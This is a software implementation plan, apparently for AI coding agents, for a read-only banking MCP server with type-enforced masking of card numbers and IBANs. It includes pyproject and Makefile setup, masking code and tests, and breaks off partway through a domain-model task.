# Postern Foundation and Read Surface Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** A stateless FastMCP server that serves four read-only banking tools plus a bootstrap tool over Streamable HTTP, with masking enforced by type, header/body validation enforced at the ASGI layer, and the read/write import boundary enforced by lint, all against a stubbed backend.

**Architecture:** A uv workspace with one shared library (`packages/postern-core`) and two service packages (`services/api`, `services/confirm`). Only `services/api` is built in this plan; `services/confirm` exists as an empty package so the import-linter contract that forbids `services.api` from importing it is live from day one. The MCP server is assembled by a `build_server()` factory taking an injected customer resolver, which is the single choke point for "the token is the identity" and the seam that makes tools testable without an auth round trip.

**Tech Stack:** Python 3.12, uv 0.12.x workspace, fastmcp 4.0.3, pydantic 2.13.x, Starlette ASGI middleware, pytest 8 + pytest-asyncio 1.4 (`asyncio_mode = "auto"`), httpx2 as the façade's HTTP client, ruff, mypy strict, import-linter 2.15.

---

## Scope and boundaries

**In scope:** handoff §11 steps 3 to 8. Repo skeleton, domain model and masked types, server assembly, header/body validation, per-user cache scope, façade over a stubbed backend, `accounts.list`, `accounts.get_balance`, `transactions.list`, `cards.list`, `banking_start_session`, the golden masking test, the import boundary, and a two-target Dockerfile.

**Out of scope, with the plan that covers each:**

| Deferred | Plan | Blocked by |
|---|---|---|
| Postgres, consents, challenges, audit log | 2 | nothing |
| Vault keys, internal JWT minting, read/write minter split, JWKS | 3 | handoff §10.22 |
| RFC 8628 device grant, rotating QR, pairing code, client allowlist | 4 | handoff §10.10 |
| Tier-1 writes (`cards.freeze_card`) | 5 | handoff §10.4 |
| Payments, tier 2 | 6 | handoff §10.4, §10.10, §10.13, §10.17 |
| Terraform, PrivateLink, Istio, WAF, RDS | separate repo (handoff §12.3) | |

**Status, 2026-09-12:** Tasks 0, 1 and 2 are complete, committed as "chore: uv workspace skeleton with local CI gates", "docs: record facade HTTP client decision (httpx2, MockTransport)", and "feat(domain): masked PAN and IBAN types enforced by validator". Security review of Task 2 found defects in this plan's own text, corrected below; see `docs/decisions/0001-facade-http-client.md` for the façade HTTP client decision.

**Naming assumption:** the design docs say `bank-mcp` / `bank_mcp_core`; this plan uses the repo's name, `postern` / `postern_core`. If that flips, it is one rename across this file and the skeleton.

---

## Verified facts this plan depends on

Checked against primary sources on 2026-09-12. Anything not here is design reasoning, not a verified fact.

**MCP `2026-07-28`** (modelcontextprotocol.io/specification/2026-07-28):
- Header routing: `Mcp-Method` (all requests), `Mcp-Name` (`tools/call`, `resources/read`, `prompts/get`), plus `MCP-Protocol-Version`. Servers that parse the body **MUST** reject mismatches with **HTTP 400** and JSON-RPC **`-32020`** (`HeaderMismatch`).
- `ttlMs` and `cacheScope` are **required** fields on `server/discover`, `tools/list`, `prompts/list`, `resources/list`, `resources/templates/list`, `resources/read`. `cacheScope` is exactly `"public" | "private"`. `"private"` means "MUST NOT be shared across authorization contexts". `tools/call` is not cacheable.
- `instructions` lives on the `server/discover` result (optional).
- No sessions, no `Mcp-Session-Id`, no `initialize` handshake. Every request carries `_meta["io.modelcontextprotocol/protocolVersion"]`.
- No SSE resumability: a dropped stream loses the in-flight request and the client re-issues with a new id, so **every handler must be safe to re-run**.
- DPoP / RFC 9449 appears nowhere in the spec. Zero hits.

**FastMCP 4.0.3** (released 2026-09-05, PrefectHQ, gofastmcp.com + GitHub source):
- `from fastmcp import FastMCP`; `FastMCP(name, instructions, *, auth=, middleware=, cache_ttl=, cache_scope=Literal["public","private"], ...)`.
- `@mcp.tool` bare and `@mcp.tool(...)` both work.
- `mcp.http_app(path=, middleware=, json_response=, stateless_http=, ...) -> StarletteWithLifespan`. When mounting inside a parent app you **must** pass `mcp_app.lifespan` to the parent or the session manager stays uninitialised.
- `from fastmcp.server.middleware import Middleware, MiddlewareContext`; hooks include `on_call_tool`, `on_list_tools`, `on_discover`; the tool name is `context.message.name`.
- `from fastmcp.server.dependencies import get_access_token`; returns `AccessToken | None` with `.client_id`, `.scopes`, `.expires_at`, `.claims`.
- **`ToolError` does not produce a JSON-RPC error.** It returns `CallToolResult(is_error=True)` inside HTTP 200, and there is no documented way to control the HTTP status at that layer. `McpError(code=..., message=...)` sets an arbitrary JSON-RPC code but is only documented from middleware hooks, and still does not set an HTTP status.
- `ctx.set_state` / `get_state` are **async** in v4 (`await ctx.set_state(k, v)`).
- Tool annotations come from `mcp.types`: `annotations=ToolAnnotations(readOnlyHint=True, ...)`.
- In-process test client: `from fastmcp.client import Client`; `async with Client(transport=mcp) as c`. It accepts **no auth argument**, which is why this plan injects the customer resolver instead.
- **Dependency is `httpx2>=2.5.0`, not `httpx`.**

**Libraries:** pydantic 2.13.5 (`AfterValidator` preferred over `BeforeValidator`; `Annotated` metadata applies right-to-left), import-linter 2.15 (`lint-imports`, exits 1 on violation), uv 0.12.13, pytest-asyncio 1.4.0 (set both `asyncio_default_fixture_loop_scope` and `asyncio_default_test_loop_scope` or session teardown raises), httpx2 2.12.0 (the Task 1 spike found the `httpx`-mocking library cannot mock it; see `docs/decisions/0001-facade-http-client.md`), testcontainers 4.15.0 (`testcontainers.community.postgres`).

**Pydantic 2.13 validation-bypass surface for `Annotated[str, AfterValidator]`**, measured during the Task 2 review against a model with `model_config = ConfigDict(extra="forbid", frozen=True)` and a `MaskedPan` field: `Strict(pan="4111111111114417").model_dump_json()` masks correctly; `Strict.model_construct(pan="4111111111114417").model_dump_json()` returns the raw PAN; `ok.model_copy(update={"pan": "4111111111114417"}).model_dump_json()` also returns the raw PAN, even under `frozen=True`. Plain attribute assignment (`ok.pan = "..."`) is the one idiom `frozen=True` blocks, raising `ValidationError`. No `ConfigDict` option closes `model_construct`; `model_copy(update=...)` is closed only by overriding the method to re-validate. Separately, `ValidationError.__str__` embeds `input_value=...` by default, confirmed by constructing with a raw PAN embedded in a string and finding it in `str(exc)`; `hide_input_in_errors=True` removes it from `str(exc)` and `repr(exc)` only, confirmed the same way. It does **not** remove it from `exc.errors()` or `exc.json()`, which still carry the raw PAN by default regardless of that setting — measured against Task 2's final commit (`3b0020d`): `"4111111111114417" in repr(exc.errors())` → `True`, `in exc.json()` → `True`, `in repr(exc.errors(include_input=False))` → `False`. Closing the leak for any client-facing error payload requires calling `errors(include_input=False)` / `json(include_input=False)` explicitly at the point of serialization; `hide_input_in_errors` alone is not sufficient.

---

## Design decisions this plan locks in

**D1. Header/body validation is ASGI middleware, not FastMCP middleware.** Forced by the FastMCP finding above. It runs before the MCP app sees the request, reads and replays the body, and returns a real HTTP 400. This is the only way to satisfy the spec's MUST.

**D2. Strict header presence is behind a flag, default off.** The spec says the headers are required for compliance, but FastMCP 4 serves five protocol revisions and pre-`2026-07-28` clients do not send them. Mismatch is always a 400. Absence is a 400 only when `POSTERN_STRICT_HEADERS=1`. Flip it to on once the client allowlist (Plan 4) is entirely on `2026-07-28`.

**D3. Customer identity is resolved through an injected `CustomerResolver`.** Production reads `get_access_token().claims["sub"]`. Tests inject a fake. This gives one enforcement point for "never accept `user_id` as a tool argument" (handoff §6.2) and avoids the undocumented in-process auth path.

**D4. `cache_scope="private"` is set at server construction**, not per tool. The catalog varies by consent, so no result may be shared across authorization contexts.

**D5. The façade's HTTP client is `httpx2`, resolved by the Task 1 spike.** `httpx2` is what FastMCP pulls. The `httpx`-mocking library cannot mock it (`TypeError` at mock-setup time, before any request), so it is dropped from the dev dependency group; backend tests mock at the transport layer instead, via an injected `httpx2.MockTransport(handler)`. See `docs/decisions/0001-facade-http-client.md`.

**D6. Masked types strict-parse and reject rather than coerce.** A "looks masked" or "scrape any digits" approach coerces arbitrary text into a well-formed mask: the original approach turned `"card 4111111111114417 exp 12/28"` into `'•••• 1228'`, a confident, wrong answer that nothing downstream can catch. Rejecting anything that is not a well-formed PAN or a mod-97-valid IBAN is the only way to keep every accepted mask trustworthy.

**D7. `_Strict` re-validates on `model_copy(update=...)` and hides input in errors; `model_construct` is forbidden by convention.** `model_copy(update=...)` and `model_construct` both bypass `Annotated` validators even under `frozen=True` (see Verified facts above). `model_copy` is closed by overriding it to re-validate through `model_validate`. `model_construct` cannot be closed by configuration, so it is forbidden by convention, backstopped by the Task 7 golden masking test on serialized tool output.

---

## File structure

```
postern/
├── pyproject.toml                      # workspace root + services package
├── .python-version                     # pins 3.12: mypy, ruff and the Dockerfile all target it
├── Makefile                            # make ci runs every gate locally
├── .importlinter                       # forbidden contract: api -/-> confirm
├── Dockerfile                          # two targets: api, confirm
├── docker-compose.yml                  # stub backend + future postgres
├── packages/postern-core/
│   ├── pyproject.toml
│   └── src/postern_core/
│       ├── py.typed                    # PEP 561 marker, needed for mypy across packages
│       ├── domain/
│       │   ├── masking.py              # MaskedPan, MaskedIban
│       │   ├── money.py                # Money
│       │   └── models.py               # Account, Balance, Transaction, Card, SessionInfo
│       ├── identity.py                 # CustomerRef, CustomerResolver protocol
│       └── facade/
│           ├── client.py               # BackendClient: one HTTP client, one auth hook
│           ├── accounts.py
│           ├── transactions.py
│           └── cards.py
├── services/
│   ├── __init__.py
│   ├── api/
│   │   ├── __init__.py
│   │   ├── server.py                   # build_server() + module-level `app`
│   │   ├── settings.py
│   │   ├── asgi/
│   │   │   └── header_validation.py    # D1
│   │   └── tools/
│   │       ├── bootstrap.py
│   │       ├── accounts.py
│   │       ├── transactions.py
│   │       └── cards.py
│   └── confirm/
│       └── __init__.py                 # empty in this plan; exists for D1's lint contract
└── tests/
    ├── conftest.py
    ├── fixtures/backend_responses.py
    ├── test_masking_types.py
    ├── test_masking_golden.py
    ├── test_header_body_mismatch.py
    ├── test_no_write_from_api.py
    ├── test_tools_accounts.py
    ├── test_tools_transactions.py
    ├── test_tools_cards.py
    └── test_bootstrap.py
```

---

### Task 0: Repo skeleton and the local gate runner

**Files:**
- Create: `pyproject.toml`, `Makefile`, `.importlinter`, `.gitignore`, `.python-version`
- Create: `packages/postern-core/pyproject.toml`, `packages/postern-core/src/postern_core/__init__.py`, `packages/postern-core/src/postern_core/py.typed`
- Create: `services/__init__.py`, `services/api/__init__.py`, `services/confirm/__init__.py`
- Create: `tests/__init__.py`

- [ ] **Step 1: Write `.python-version`**

```bash
echo "3.12" > .python-version
```

Pins the interpreter `uv` resolves the venv against. Without it, `uv sync` resolved to Python 3.13.13, while mypy targets `python_version = "3.12"` (Step 2 below), ruff targets `py312`, and Task 13's Dockerfile uses `python:3.12-slim`; the gates would then type-check 3.12 semantics on a 3.13 interpreter.

- [ ] **Step 2: Write the root `pyproject.toml`**

```toml
[project]
name = "postern"
version = "0.1.0"
requires-python = ">=3.12"
dependencies = [
    "postern-core",
    "fastmcp>=4.0.3,<5",
    "uvicorn[standard]>=0.34",
    "structlog>=25.1",
]

[tool.uv]
package = false

[tool.uv.workspace]
members = ["packages/*"]

[tool.uv.sources]
postern-core = { workspace = true }

[dependency-groups]
dev = [
    "pytest>=8.3",
    "pytest-asyncio>=1.4",
    "ruff>=0.16",
    "mypy>=1.14",
    "import-linter>=2.15",
]

[tool.pytest.ini_options]
asyncio_mode = "auto"
asyncio_default_fixture_loop_scope = "session"
asyncio_default_test_loop_scope = "session"
testpaths = ["tests"]

[tool.mypy]
strict = true
python_version = "3.12"

[tool.ruff]
line-length = 100
target-version = "py312"

[tool.ruff.lint]
select = ["E", "F", "I", "UP", "B", "ASYNC", "S"]

[tool.ruff.lint.per-file-ignores]
"tests/**" = ["S101"]
```

`package = false` makes the root a virtual project: uv installs its dependencies but does not build it, so `services/` is imported from the repo root. Both loop-scope settings are required; omitting `asyncio_default_test_loop_scope` while the fixture scope is `session` raises `RuntimeError: attached to a different loop` at teardown (measured on pytest-asyncio 1.4.0). `S101` (assert) is ignored only under `tests/**`, not globally: a global ignore would let a bare `assert` in production masking or auth code pass silently, and asserts are stripped under `python -O`.

- [ ] **Step 3: Write `packages/postern-core/pyproject.toml`**

```toml
[project]
name = "postern-core"
version = "0.1.0"
requires-python = ">=3.12"
dependencies = [
    "pydantic>=2.13,<3",
]

[build-system]
requires = ["uv_build>=0.9,<0.13"]
build-backend = "uv_build"
```

No workspace keys in a member. The default `src/postern_core/` layout matches the file structure above, so no `module-name` override is needed here.

- [ ] **Step 4: Create the package skeletons**

```bash
mkdir -p packages/postern-core/src/postern_core/domain \
         packages/postern-core/src/postern_core/facade \
         services/api/asgi services/api/tools services/confirm tests/fixtures
touch packages/postern-core/src/postern_core/__init__.py \
      packages/postern-core/src/postern_core/domain/__init__.py \
      packages/postern-core/src/postern_core/facade/__init__.py \
      services/__init__.py services/api/__init__.py services/api/asgi/__init__.py \
      services/api/tools/__init__.py services/confirm/__init__.py \
      tests/__init__.py tests/fixtures/__init__.py
```

- [ ] **Step 5: Add the `py.typed` marker to `postern-core`**

```bash
touch packages/postern-core/src/postern_core/py.typed
```

Empty, per PEP 561. Without it, any mypy invocation that does not pass both `packages` and `services` in the same command degrades to `Skipping analyzing "postern_core": module is installed, but missing library stubs or py.typed marker`. It is included automatically in the wheel built by the `uv_build` backend.

- [ ] **Step 6: Write `.importlinter`**

```ini
[importlinter]
root_packages =
    services
    postern_core

[importlinter:contract:api-not-confirm]
name = API service must not import the write path
type = forbidden
source_modules =
    services.api
forbidden_modules =
    services.confirm
```

This is the A3 control (handoff §8.2) expressed as a lint rule. `lint-imports` exits 1 on violation. `root_packages` must be plural: the contract needs to see the transitive route through the shared library `postern_core`, and with only `services` declared as the root package, import-linter cannot see `postern_core` at all, so the two-hop violation `services.api -> postern_core -> services.confirm` is reported as kept, exit 0.

- [ ] **Step 7: Write the `Makefile`**

```make
.PHONY: ci lint fmt fmt-check type imports lock test

ci: lint fmt-check type imports lock test

lint:
	uv run ruff check .

fmt:
	uv run ruff format .

fmt-check:
	uv run ruff format --check packages services tests

type:
	uv run mypy packages services tests

imports:
	uv run lint-imports

lock:
	uv lock --check --offline

test:
	@if [ -z "$$(find tests -name 'test_*.py' -print -quit 2>/dev/null)" ]; then \
		echo "no tests yet, skipping"; \
	else \
		uv run pytest -q; \
	fi
```

`make ci` is the gate runner. GitHub Actions minutes are billed on private repos, so the gates run locally first; a workflow file lands in Task 14 but is left disabled for you to enable. `fmt-check` is scoped to `packages services tests`, not `.`, because `ruff format` on `.` also reformats the Python code fences inside the markdown design docs in `docs/`. The `test` recipe checks for test files before invoking pytest rather than masking pytest's exit code 5 (no tests collected); it stops firing on its own once Task 2 adds real tests.

- [ ] **Step 8: Install and verify the workspace resolves**

Run: `uv sync`
Expected: resolves and installs; then `uv run python -c "import postern_core, services.api, services.confirm; print('ok')"` prints `ok`.

If `uv sync` rejects `package = false` alongside `[project].dependencies`, the fallback is to delete `[tool.uv] package = false` and add `[tool.uv.build-backend] module-root = ""` / `module-name = "services"` with a `uv_build` `[build-system]`. Verify with the same import line.

- [ ] **Step 9: Confirm the gates run green on an empty tree**

Run: `make ci`
Expected: `lint` passes, `fmt-check` passes, `type` passes, `imports` prints `Contracts: 1 kept, 0 broken.`, `lock` passes, and `test` prints `no tests yet, skipping` and exits 0 (no test files exist yet; this disappears once Task 2 adds real tests).

- [ ] **Step 10: Commit**

```bash
git add pyproject.toml Makefile .importlinter .gitignore .python-version packages services tests
git commit -m "chore: uv workspace skeleton with local CI gates"
```

---

### Task 1: Spike, resolve `httpx2` vs `httpx` for the façade

**Why this is first:** `fastmcp` 4.0.3 depends on `httpx2>=2.5.0` and lists no `httpx`. The façade client's HTTP library, and whether its test-mocking approach actually works against it, determines every backend test in Tasks 8 to 11. Guessing here invalidates four tasks.

**Files:**
- Create: `docs/decisions/0001-facade-http-client.md`

- [ ] **Step 1: Observe what is actually installed**

Run: `uv run python -c "import httpx2; print(httpx2.__version__)"`
Expected: `httpx2` imports. Verified: `2.12.0`.

- [ ] **Step 2: Test the two mocking approaches against httpx2**

First, the library that mocks `httpx` requests: setting up a mock against an `httpx2.Response` raises `TypeError: <Response [200 OK]> is not an instance of httpx.Response` at mock-setup time, before any request is made. It does not recognize `httpx2`'s response type, so it cannot mock this client.

Second, `httpx2.MockTransport(handler)` injected into `BackendClient`'s transport: this works, and the handler observes a custom `Authorization` header set by the client.

- [ ] **Step 3: Record the decision**

Write `docs/decisions/0001-facade-http-client.md` with the observed result: the façade uses `httpx2` (FastMCP's own dependency, one HTTP stack in the image); backend tests mock at the **transport** layer via an injected `httpx2.MockTransport(handler)`; the `httpx`-mocking library is dropped from the dev dependency group, since it cannot mock `httpx2`.

The decision record must state: the date, the observed command output for both approaches in Step 2, the chosen option, and the consequence for Tasks 8 to 11.

- [ ] **Step 4: Commit**

```bash
git add docs/decisions/0001-facade-http-client.md
git commit -m "docs: record facade HTTP client decision (httpx2, MockTransport)"
```

> **Tasks 8 to 11 below are written for the `MockTransport` form.** That is the only form: Step 2 above ruled out the alternative.

---

### Task 2: Masked types

**Files:**
- Create: `packages/postern-core/src/postern_core/domain/masking.py`
- Test: `tests/test_masking_types.py`

Handoff §6.5: masking is a type property, never a function someone remembers to call. Policy: PAN is last 4 only (`•••• 4417`), never first-6-plus-last-4. Own IBAN is country code plus last 4 (`ES•• •••• 4417`). Masks must be stable so the model can correlate across turns, and must never be accepted as an input identifier.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_masking_types.py
import re

import pytest
from postern_core.domain.masking import MaskedIban, MaskedPan
from pydantic import BaseModel, ConfigDict, ValidationError


class Card(BaseModel):
    # Masking is a type property, but Pydantic's own error formatting still
    # echoes the raw offending input via `input_value` in every
    # ValidationError unless the consuming model opts out. Any real model
    # built on MaskedPan/MaskedIban must set this too (see report).
    model_config = ConfigDict(hide_input_in_errors=True)

    pan: MaskedPan


class Account(BaseModel):
    model_config = ConfigDict(hide_input_in_errors=True)

    iban: MaskedIban


def test_pan_is_masked_on_construction() -> None:
    assert Card(pan="4111111111114417").pan == "•••• 4417"


def test_pan_masking_is_stable() -> None:
    assert Card(pan="4111 1111 1111 4417").pan == Card(pan="4111111111114417").pan


def test_pan_already_masked_is_idempotent() -> None:
    assert Card(pan="•••• 4417").pan == "•••• 4417"


def test_pan_too_short_is_rejected() -> None:
    with pytest.raises(ValidationError):
        Card(pan="417")


def test_iban_keeps_country_code_and_last_four() -> None:
    assert Account(iban="ES9121000418450200051332").iban == "ES•• •••• 1332"


def test_iban_without_country_code_is_rejected() -> None:
    with pytest.raises(ValidationError):
        Account(iban="9121000418450200051332")


def test_iban_already_masked_is_idempotent() -> None:
    assert Account(iban="ES•• •••• 1332").iban == "ES•• •••• 1332"


def test_masked_pan_serializes_as_a_plain_string() -> None:
    assert Card(pan="4111111111114417").model_dump_json() == '{"pan":"•••• 4417"}'


def test_pan_with_mask_prefix_and_appended_full_pan_is_rejected() -> None:
    """A value that merely starts with the mask marker must not be coerced
    into a well-formed mask. Strict-parse rejects it outright instead of
    accepting whatever digits happen to be attached after it."""
    leaky = "•••• 4417 extra 4111111111114417"
    with pytest.raises(ValidationError) as exc_info:
        Card(pan=leaky)
    assert "4111111111114417" not in str(exc_info.value)


def test_iban_with_mask_substring_and_appended_full_iban_is_rejected() -> None:
    """A value that merely contains the mask marker somewhere must not be
    coerced into a well-formed mask. Strict-parse rejects it outright."""
    leaky = "ES•••• 1332 ES9121000418450200051332"
    with pytest.raises(ValidationError) as exc_info:
        Account(iban=leaky)
    assert "9121000418450200051332" not in str(exc_info.value)


def test_bogus_and_attacker_controlled_values_are_rejected() -> None:
    """Well-formed-looking garbage must not be coerced into a confident,
    wrong last-four. None of these are real card numbers or IBANs."""
    with pytest.raises(ValidationError):
        Account(iban="XX0000")
    with pytest.raises(ValidationError):
        Account(iban="hello world 1332")
    with pytest.raises(ValidationError):
        Card(pan="+34 600 123 456")
    with pytest.raises(ValidationError):
        Card(pan="card 4111111111114417 exp 12/28")


def test_two_pans_sharing_last_four_render_identically() -> None:
    """Deliberate under minimization: last-4 masking cannot distinguish two
    cards that happen to share their last four digits. Do not widen this to
    more digits to "fix" the collision; the collision is the point."""
    assert Card(pan="4111111111114417").pan == Card(pan="5500000000004417").pan


def test_two_ibans_sharing_last_four_render_identically() -> None:
    """Same deliberate collision as above, for IBANs. Both values below are
    real mod-97-valid ES IBANs that happen to share their last four digits."""
    assert (
        Account(iban="ES9121000418450200051332").iban
        == Account(iban="ES8921000418450200091332").iban
    )


# Hostile PAN-shaped inputs: bare, spaced, hyphenated, embedded in prose,
# before/after the mask marker, separated by non-space whitespace the
# validator must not silently absorb, and Unicode (Arabic-Indic) digits.
_PAN_HOSTILE_INPUTS = [
    "4111111111114417",
    "4111 1111 1111 4417",
    "4111-1111-1111-4417",
    "my card number is 4111111111114417 thanks",
    "•••• 0000 4111111111114417",
    "4111111111114417 •••• 0000",
    "4111\n1111\n1111\n4417",
    "4111\t1111\t1111\t4417",
    "4111​1111​1111​4417",
    "4111\xa01111\xa01111\xa04417",
    "4111 1111 1111 ٤٤١٧",
]

# Same shapes, for a full IBAN.
_IBAN_HOSTILE_INPUTS = [
    "ES9121000418450200051332",
    "ES91 2100 0418 4502 0005 1332",
    "es9121000418450200051332",
    "IBAN: ES9121000418450200051332 please",
    "ES•• •••• 1332 ES9121000418450200051332",
    "ES9121000418450200051332 ES•• •••• 1332",
    "ES91\n2100\n0418\n4502\n0005\n1332",
    "ES91\t2100\t0418\t4502\t0005\t1332",
    "ES91​21000418450200051332",
    "ES91\xa021000418450200051332",
]


@pytest.mark.parametrize("value", _PAN_HOSTILE_INPUTS)
def test_pan_hostile_inputs_never_leak(value: str) -> None:
    """Whichever branch a hostile PAN-shaped input takes, the invariant
    holds: an accepted value never carries a run of five or more digits and
    always has exactly four mask bullets; a rejected value never echoes the
    raw input back. This is the invariant stated once so it survives a
    rewrite of the branching logic above."""
    try:
        out = Card(pan=value).pan
    except ValidationError as exc:
        assert value not in str(exc)
        return
    assert re.search(r"[0-9]{5,}", out) is None
    assert out.count("•") in (4, 6)


@pytest.mark.parametrize("value", _IBAN_HOSTILE_INPUTS)
def test_iban_hostile_inputs_never_leak(value: str) -> None:
    """Same invariant as above, for IBAN-shaped hostile input."""
    try:
        out = Account(iban=value).iban
    except ValidationError as exc:
        assert value not in str(exc)
        return
    assert re.search(r"[0-9]{5,}", out) is None
    assert out.count("•") in (4, 6)
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `uv run pytest tests/test_masking_types.py -q`
Expected: FAIL, `ModuleNotFoundError: No module named 'postern_core.domain.masking'`

- [ ] **Step 3: Write the implementation**

```python
# packages/postern-core/src/postern_core/domain/masking.py
"""Masked identifier types (handoff §6.5).

These types exist so that a handler which forgets to mask fails validation
rather than leaking. Never replace them with a `str` plus a helper function.
"""

import re
from typing import Annotated

from pydantic import AfterValidator

_MASK = "••••"
_PAN_MASKED_RE = re.compile(r"•••• [0-9]{4}")
_IBAN_MASKED_RE = re.compile(r"[A-Z]{2}•• •••• [0-9]{4}")
_PAN_RE = re.compile(r"[0-9]{12,19}")
_IBAN_RE = re.compile(r"[A-Z]{2}[0-9]{2}[A-Z0-9]{10,30}")


def _mod97_ok(compact: str) -> bool:
    """ISO 7064 mod-97 check (the IBAN checksum algorithm).

    Move the first four characters to the end, map each character to its
    base-36 value written out as a decimal string, and require the
    resulting integer mod 97 to equal 1.
    """
    rearranged = compact[4:] + compact[:4]
    digits = "".join(str(int(ch, 36)) for ch in rearranged)
    return int(digits) % 97 == 1


def _mask_pan(value: str) -> str:
    if _PAN_MASKED_RE.fullmatch(value):
        return value
    compact = value.replace(" ", "").replace("-", "")
    if not _PAN_RE.fullmatch(compact):
        raise ValueError("not a PAN: expected 12 to 19 digits")
    return f"{_MASK} {compact[-4:]}"


def _mask_iban(value: str) -> str:
    if _IBAN_MASKED_RE.fullmatch(value):
        return value
    compact = "".join(value.split()).upper()
    if not _IBAN_RE.fullmatch(compact) or not _mod97_ok(compact):
        raise ValueError("not an IBAN: expected ISO 13616 form")
    return f"{compact[:2]}•• {_MASK} {compact[-4:]}"


MaskedPan = Annotated[str, AfterValidator(_mask_pan)]
"""Card PAN, last four digits only. Cannot represent a full PAN."""

MaskedIban = Annotated[str, AfterValidator(_mask_iban)]
"""Own IBAN, country code plus last four. Counterparty IBANs are omitted entirely."""
```

This strict-parses rather than coerces, for two measured reasons.

First, the original `value.startswith(_MASK)` and `_MASK in value` checks treated "looks masked" as "is masked". `_mask_pan("•••• 4417 extra 4111111111114417")` returned the string verbatim, full PAN included.

Second, the original approach scraped every digit out of the input and mapped the last four onto a mask, which coerces arbitrary text into a well-formed mask: `_mask_pan("card 4111111111114417 exp 12/28")` returned `'•••• 1228'` (the expiry, not the card), and `_mask_pan("+34 600 123 456")` returned `'•••• 3456'`. Every one of those outputs is well formed, so nothing downstream can distinguish it from a correctly masked value.

`_mask_iban` enforces the ISO 7064 mod-97 checksum on the compact form before masking. `_mask_pan` deliberately does not enforce Luhn: the project's own test fixture `4111111111114417` is not Luhn-valid (checksum digit sum 45, not divisible by 10), and a Luhn gate would refuse to display a card the backend actually sent.

- [ ] **Step 4: Run the test to verify it passes**

Run: `uv run pytest tests/test_masking_types.py -q`
Expected: PASS, 34 passed

- [ ] **Step 5: Commit**

```bash
git add packages/postern-core/src/postern_core/domain/masking.py tests/test_masking_types.py
git commit -m "feat(domain): masked PAN and IBAN types enforced by validator"
```

---

### Task 3: Money, identity, and the MCP-facing domain models

**Files:**
- Create: `packages/postern-core/src/postern_core/domain/money.py`
- Create: `packages/postern-core/src/postern_core/identity.py`
- Create: `packages/postern-core/src/postern_core/domain/models.py`
- Test: `tests/test_domain_models.py`

**Files added in the second security-review round (see the third addendum after Step
10):** `packages/postern-core/src/postern_core/domain/base.py` (the `_Strict` base, moved
out of `models.py` so `money.py` can derive `Money` from it too); `FreeText` added to the
existing `packages/postern-core/src/postern_core/domain/masking.py`; tests added to
`tests/test_masking_types.py`.

Handoff §6.5: amounts are structured with explicit currency and an `as_of` timestamp, with the account identifier alongside every balance, because we control none of the rendering. Handoff §8.4: these models are the MCP-facing contract, deliberately distinct from whatever the backends return.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_domain_models.py
from datetime import UTC, datetime
from decimal import Decimal

import pytest
from pydantic import ValidationError

from postern_core.domain.models import Account, Balance, Card, Transaction
from postern_core.domain.money import Money
from postern_core.identity import CustomerRef


def test_money_carries_currency_and_serializes_exactly() -> None:
    m = Money(amount=Decimal("340.00"), currency="EUR")
    assert m.model_dump_json() == '{"amount":"340.00","currency":"EUR"}'


def test_money_rejects_a_non_iso_currency() -> None:
    with pytest.raises(ValidationError):
        Money(amount=Decimal("1"), currency="euros")


def test_balance_carries_account_ref_and_as_of() -> None:
    b = Balance(
        account_ref="acc_7f3a",
        amount=Money(amount=Decimal("1200.50"), currency="EUR"),
        as_of=datetime(2026, 9, 12, 10, 0, tzinfo=UTC),
    )
    assert b.account_ref == "acc_7f3a"
    assert b.as_of.tzinfo is not None


def test_balance_rejects_a_naive_timestamp() -> None:
    with pytest.raises(ValidationError):
        Balance(
            account_ref="acc_7f3a",
            amount=Money(amount=Decimal("1"), currency="EUR"),
            as_of=datetime(2026, 9, 12, 10, 0),
        )


def test_account_masks_its_iban() -> None:
    a = Account(ref="acc_7f3a", label="Joint expenses", iban="ES9121000418450200051332")
    assert a.iban == "ES•• •••• 1332"


def test_card_masks_its_pan() -> None:
    card = Card(ref="crd_1", label="Debit", pan="4111111111114417", status="active")
    assert card.pan == "•••• 4417"


def test_transaction_has_no_counterparty_account_field() -> None:
    assert "counterparty_iban" not in Transaction.model_fields
    assert "counterparty_account" not in Transaction.model_fields


def test_models_reject_unknown_fields() -> None:
    # `pan` is not a field on Account. Constructed via model_validate on a plain
    # dict, not Account(pan=...) directly: the latter is a field name mypy
    # --strict statically rejects (pydantic v2's BaseModel is a PEP 681
    # dataclass_transform, so a keyword mypy cannot see on the model is a
    # call-arg error, not just a runtime one), and the point of this test is
    # the runtime extra="forbid" behaviour, not a static-typing violation.
    with pytest.raises(ValidationError):
        Account.model_validate(
            {
                "ref": "acc_1",
                "label": "X",
                "iban": "ES9121000418450200051332",
                "pan": "4111111111114417",
            }
        )


def test_customer_ref_is_opaque() -> None:
    with pytest.raises(ValidationError):
        CustomerRef(value="ES9121000418450200051332")
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `uv run pytest tests/test_domain_models.py -q`
Expected: FAIL, `ModuleNotFoundError: No module named 'postern_core.domain.money'`

**Corrected against what execution actually found (2026-09-12):** the plan originally
had `test_card_masks_its_pan` call `Card(ref="crd_1", label="Debit", pan="4111111111114417")`
with no `status`. Once `models.py` (Step 5) exists, that call fails with `status: Field
required` rather than exercising masking, and the test file never reaches the "11 passed"
state Step 9 claims. See the correction note above `test_card_masks_its_pan`.

**Second correction (2026-09-12):** the plan originally had `test_models_reject_unknown_fields`
call `Account(ref="acc_1", label="X", iban="ES9121000418450200051332", pan="4111111111114417")`
directly. `mypy --strict` fails this line with `Unexpected keyword argument "pan" for
"Account"  [call-arg]`: pydantic v2's `BaseModel` is a PEP 681 `dataclass_transform`, so
mypy statically checks constructor keywords against declared fields even with no
`pydantic.mypy` plugin configured (this repo configures none). The test's own point is
the *runtime* `extra="forbid"` behaviour, which `Account.model_validate({...})` on a
plain dict exercises identically (confirmed: both raise `ValidationError` with
`type == "extra_forbidden"`) without a keyword mypy can see statically. See the
correction note above `test_models_reject_unknown_fields`.

- [ ] **Step 3: Write `money.py`**

```python
# packages/postern-core/src/postern_core/domain/money.py
from decimal import Decimal
from typing import Annotated

from pydantic import BaseModel, BeforeValidator, ConfigDict, StringConstraints

CurrencyCode = Annotated[str, StringConstraints(pattern=r"^[A-Z]{3}$")]


def _reject_float(value: object) -> object:
    """Reject a bare Python `float` outright, before pydantic's own `Decimal`
    coercion runs.

    A JSON number decoded by `json.loads` becomes a `float`, and IEEE 754
